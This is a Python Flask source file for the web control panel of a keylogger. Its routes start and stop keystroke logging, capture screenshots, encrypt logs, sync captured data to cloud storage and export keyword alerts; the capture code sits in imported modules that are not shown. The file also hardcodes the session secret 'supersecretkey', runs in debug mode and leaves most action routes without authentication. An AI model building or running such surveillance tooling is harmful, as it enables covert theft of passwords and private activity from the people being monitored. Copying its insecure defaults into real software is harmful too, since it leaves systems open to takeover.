from flask import Flask, render_template, request, redirect, url_for, session, jsonify, send_file
from auth import check_login
from keylogger import start_keylogger, stop_keylogger, export_alerts_to_csv
from analytics import get_key_stats, get_activity_series
from encrypt import encrypt_logs
from screenshot import capture_screenshot
from sync import sync_to_cloud
from datetime import datetime, timedelta
import os

app = Flask(__name__)
app.secret_key = "supersecretkey"

LOG_DIR = "data/logs"
os.makedirs(LOG_DIR, exist_ok=True)
os.makedirs("data/screenshots", exist_ok=True)
os.makedirs("data/encrypted", exist_ok=True)
os.makedirs("data/cloud", exist_ok=True)

@app.route("/")
def home():
    if "user" in session:
        return redirect(url_for("dashboard"))
    return render_template("login.html")

@app.route("/login", methods=["POST"])
def login():
    username = request.form["username"]
    password = request.form["password"]
    if check_login(username, password):
        session["user"] = username 
        return redirect(url_for("dashboard"))
    return render_template("login.html", error="Invalid credentials")

@app.route("/logout")
def logout():
    session.pop("user", None)
    return redirect(url_for("home"))

@app.route("/dashboard")
def dashboard():
    if "user" not in session:
        return redirect(url_for("home"))
    return render_template("dashboard.html")

@app.route("/encrypt_logs", methods=["POST"])
def encrypt_logs_route():
    return jsonify({"status": encrypt_logs()})

@app.route("/take_screenshot", methods=["POST"])
def take_screenshot_route():
    return jsonify({"status": capture_screenshot()})

@app.route("/sync_data", methods=["POST"])
def sync_data_route():
    return jsonify({"status": sync_to_cloud()})

@app.route("/api/stats")
def api_stats():
    return jsonify(get_key_stats())


@app.route("/api/recent_alerts")
def api_recent_alerts():
    try:
        now = datetime.now()
        cutoff = now - timedelta(minutes=5)
        recent_alerts = []

        alert_file_path = "data/logs/alerts.txt"
        if os.path.exists(alert_file_path):
            with open(alert_file_path, "r", encoding="utf-8") as f:
                for line in f:
                    if "[ALERT]" in line:
                        
                        
                        try:
                            ts_str = line.split(" detected at ")[1].split(": ")[0]
                            ts = datetime.strptime(ts_str, "%Y-%m-%d_%H-%M-%S")
                            if ts >= cutoff:
                                recent_alerts.append(line.strip())
                        except Exception:
                            continue

        return jsonify({"alerts": recent_alerts})
    except Exception as e:
        return jsonify({"alerts": [], "error": str(e)})

@app.route("/export_alerts", methods=["GET"])
def export_alerts():
    csv_path = "data/logs/alerts.csv"
    success = export_alerts_to_csv(csv_path)
    if not success:
        return "Failed to export alerts", 500
    return send_file(csv_path, as_attachment=True)

@app.route("/toggle_keylogger", methods=["POST"])
def toggle_keylogger():
    action = request.json.get("action")
    if action == "start":
        start_keylogger()
        return jsonify({"status": "Keylogger started"})
    elif action == "stop":
        stop_keylogger()
        return jsonify({"status": "Keylogger stopped"})
    return jsonify({"status": "Invalid action"}), 400


@app.route("/api/activity")
def api_activity():
    return jsonify({"data": get_activity_series()})

if __name__ == "__main__":
    app.run(debug=True)